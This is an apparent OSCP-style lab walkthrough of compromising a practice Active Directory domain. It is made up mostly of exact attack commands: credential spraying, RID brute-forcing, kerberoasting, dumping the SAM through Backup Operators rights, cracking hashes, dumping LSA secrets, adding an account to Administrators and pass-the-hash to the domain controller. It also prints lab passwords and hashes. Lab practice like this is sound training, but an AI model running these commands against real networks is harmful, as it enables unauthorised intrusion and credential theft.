---
Category: OSCP - TjNull
LAB: https://buymeacoffee.com/hackacademy/e/484492
Difficulty:
Featured:
aliases:
---

---
# Information / Description

DISCOUNT-487C2 <-- discount code for academy


Starting credentials for the lab:

```
lbennett : !!reiD123
```

---

# Walkthrough

I start by trying the credentials we have against all the machines in the network and protocols with this tool I forked from github -> [nxspray](https://github.com/MarcussanMG/nxcspray)

```
./nxcspray all 10.0.2.0/24 -u 'lbennett' -p '!!reiD123'
```

### SMB
![](../0.%20Assets/AD%20chain%201-1792357540318.webp)

### Ldap
![](../0.%20Assets/AD%20chain%201-1792357554995.webp)


### Winrm
![|514x78](../0.%20Assets/AD%20chain%201-1792357575185.webp)

### WMI
![](../0.%20Assets/AD%20chain%201-1792357607410.webp)



We find that the credentials are correct but we don't really have access with a terminal anywhere, I also checked the shares with no luck, so I moved to enumerating users in the domain and seeing where we can go from there


```
nxc smb 10.0.2.4 -d hack-academy.local -u 'lbennett' -p '!!reiD123'  --rid-brute
```

![](../0.%20Assets/AD%20chain%201-1792407810250.webp)

Great we find users, let's add them into a list so we can perform `as-rep roasting` and `kerberoasting`

```
nxc smb 10.0.2.4 -d hack-academy.local -u 'lbennett' -p '!!reiD123' --rid-brute 10000 | grep "(SidTypeUser)" | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

![](../0.%20Assets/AD%20chain%201-1792407828952.webp)


# as-reproasting

```
impacket-GetNPUsers 'hack-academy.local/lbennett' -usersfile users.txt -no-pass -dc-ip 10.0.2.4 -format hashcat -outputfile asrep-impacket.txt
```

![](../0.%20Assets/AD%20chain%201-1792407944972.webp)

no luck here
# kerberoasting

```
sudo impacket-GetUserSPNs -request -dc-ip $T 'hack-academy.local/lbennett:!!reiD123'
```


![](../0.%20Assets/AD%20chain%201-1792408056375.webp)  

no luck here either

Okay I am running out of options here, let's see what we can find with `bloodhound`
## bloodhound

```
bloodhound-python -u 'lbennett' -p '!!reiD123' -d hack-academy.local -dc DC01.hack-academy.local -ns $T -c All --zip
```

didn't find much so let's check with ldap directly


## Ldap domain dump

```
ldapdomaindump -u 'hack-academy.local\lbennett' -p '!!reiD123' $T
```

I started a webserver and opened the `users.html` file and we can find the password in the description

![](../0.%20Assets/AD%20chain%201-1792408946940.webp) 
let's test the credentials

Okay they seem to be valid
![](../0.%20Assets/AD%20chain%201-1792408987629.webp)

Let's see if we can access `winrm`

![](../0.%20Assets/AD%20chain%201-1792409096828.webp)

Bingo!, let's access it


```
evil-winrm -i 10.0.2.3 -u 'twest' -p 'HappyCactus$10'
```

![](../0.%20Assets/AD%20chain%201-1792409188867.webp)

After some enumeration I see a dangerous privilege which is `backup operators`

![](../0.%20Assets/AD%20chain%201-1792409564710.webp)

So I tried the `diskshadow` method but with no luck because diskshadow not installed in clients by default , so I manually did a copy of `sam` and `system`


```
reg save HKLM\SAM C:\Windows\Temp\sam.bak /y  
reg save HKLM\SYSTEM C:\Windows\Temp\system.bak /y
```



![](../0.%20Assets/AD%20chain%201-1792411409538.webp)

Downloaded both into my kali

![](../0.%20Assets/AD%20chain%201-1792411425315.webp)

And with `impacket-secretsdump` I dumped the contents

```
impacket-secretsdump -system system.bak -sam sam.bak local | tee dump.txt
```

![](../0.%20Assets/AD%20chain%201-1792411465980.webp)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:156e3de3d13ba510e8c2b62f4f5d0216:::
Matt:1002:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f::
```

Great we have a list of hashes, let's crack them

```
john hashes --format=NT -w/usr/share/wordlists/rockyou.txt
```

![](../0.%20Assets/AD%20chain%201-1792411793126.webp)

We find that `Matt` is a local administrator (we got sam so yeah makes sense)

![](../0.%20Assets/AD%20chain%201-1792423640209.webp)

We can double check with the `--local-auth` parameter in `netexec`

![](../0.%20Assets/AD%20chain%201-1792412797612.webp)

let's log in (we know we have access through rdp)
```
xfreerdp /v:10.0.2.3 /u:Matt /p:Password1!
```

![](../0.%20Assets/AD%20chain%201-1792412845130.webp)

I will add `twest` to the admin group so that we can get the `lsa` with the `--lsa` (we could also get `mimikatz` in the machine and dump the memory)

```
net localgroup Administrators "HACK-ACADEMY\twest" /add
```

![](../0.%20Assets/AD%20chain%201-1792416684206.webp)

```
netexec smb 10.0.2.3 -u 'twest' -p 'HappyCactus$10' --lsa
```

Great it works

![](../0.%20Assets/AD%20chain%201-1792416912588.webp)

let's get the hashes into a file so we can crack them

```
netexec smb 10.0.2.3 -u 'twest' -p 'HappyCactus$10' --lsa | awk '{print $5}' | fgrep '/' | tee mscash_hashes
```


![](../0.%20Assets/AD%20chain%201-1792416946927.webp)

![](../0.%20Assets/AD%20chain%201-1792417018383.webp)

password `!!Stud87`

Let's test where we have access

```
netexec smb 10.0.2.0/24 -u 'eknight' -p '!!Stud87'
```

Cool we are admins on client2

![](../0.%20Assets/AD%20chain%201-1792419046993.webp)

let's see what we can do with these credentials

```
netexec rdp 10.0.2.0/24 -u 'eknight' -p '!!Stud87'
```

![](../0.%20Assets/AD%20chain%201-1792419195115.webp)

cool we can rdp into the client

```
xfreerdp /v:10.0.2.43 /u:eknight /p:'!!Stud87'
```

![](../0.%20Assets/AD%20chain%201-1792419253347.webp)


checking `lsa` we find quite some hashes including `mthompson` and if we check in bloodhound we see `mrhompson` is a domain admin

![](../0.%20Assets/AD%20chain%201-1792419971996.webp)

![](../0.%20Assets/AD%20chain%201-1792419995448.webp)

and if we check 

![](../0.%20Assets/AD%20chain%201-1792420013395.webp)

cool lets get the hashes in a file and crack them

```
netexec smb 10.0.2.43 -u 'eknight' -p '!!Stud87' --lsa | awk '{print $5}' | fgrep '/' | tee mscash_hashesdomain
```

![](../0.%20Assets/AD%20chain%201-1792420066805.webp)


```
john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt mscash_hashesdomai
```

![](../0.%20Assets/AD%20chain%201-1792420435154.webp)


The credentials are correct
![](../0.%20Assets/AD%20chain%201-1792420547011.webp)

connect through `evil-winrm` and check the permissions

![](../0.%20Assets/AD%20chain%201-1792420581404.webp)

dumping the `sam` this time (because we want the administrator account)

![](../0.%20Assets/AD%20chain%201-1792420666101.webp)

And now its as simple as doing a `pass the hash` with `psexec`

```
impacket-psexec  -hashes 00000000000000000000000000000000:c0ced2de918b4a7c1b9f4efd225dd503 Administrator@10.0.2.4
```

![](../0.%20Assets/AD%20chain%201-1792420713720.webp)

